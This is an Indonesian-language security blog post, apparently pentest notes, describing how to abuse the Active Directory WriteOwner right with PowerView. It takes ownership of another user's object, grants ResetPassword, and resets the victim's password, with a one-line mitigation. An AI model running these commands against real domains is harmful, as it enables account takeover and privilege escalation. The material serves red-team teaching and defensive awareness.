---
title: '[ACL] WriteOwner Abuse'
date: 2022-04-2 16:30:22 +0700
categories: [Active Directory, Post Compromise Attack]
tags: [active directory, windows, writeowner, privilege escalation, lateral movement, powerview]     # TAG names should always be lowercase
author:
  name: Nairpaa
  link: https://nairpaa.github.io
---

Hak akses `WriteOwner` dengan object user memungkinkan kita untuk memodifikasi nilai object, seperti password.

### Tujuan 

- *Privilege escalation* atau
- *lateral movement*

### Prasyarat

- User dengan hak akses `WriteOwner` terhadap user lain


### Tools

- Powershell
- PowerView

---

## Tahapan eksploitasi

### Step 1: Cek Hak Akses Dengan BloodHound

Pada kasus ini, **Tom** memiliki hak akses `WriteOwner` terhadap **Claire**. 

![bloodhound writeowner](/assets/img/posts/writeowner-abuse/1.png)

### Step 2: Merubah Password Korban

Selanjutnya, kita akan memanfaatkan hak akses ini untuk merubah password **Claire**.

```powershell
# import PowerView
PS> . .\PowerView.ps1

# tetapkan tom sebagai pemilik ACL claire
PS> Set-DomainObjectOwner -identity claire -OwnerIdentity tom 

# berikan izin kepada Tom untuk mengubah kata sandi pada ACL itu
PS> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword 

# buat kredensial PowerShell dan ubah kredensial
PS> $cred = ConvertTo-SecureString "P@asdasdW0rd1" -AsPlainText -force
PS> Set-DomainUserPassword -identity claire -accountpassword $cred
```

> Selain merubah password korban, kita juga dapat mengaktifkan *reversible encryption* atau membuat user Kerberostable. Hal ini dilakukan agar tidak membahayakan environment production.
{: .prompt-note }

![ubah password berhasil](/assets/img/posts/writeowner-abuse/2.png)

## Mitigasi

Perhatikan kembali penentuan hak akses **WriteOwner**.

---

## Referensi

- https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/writeowner-exploit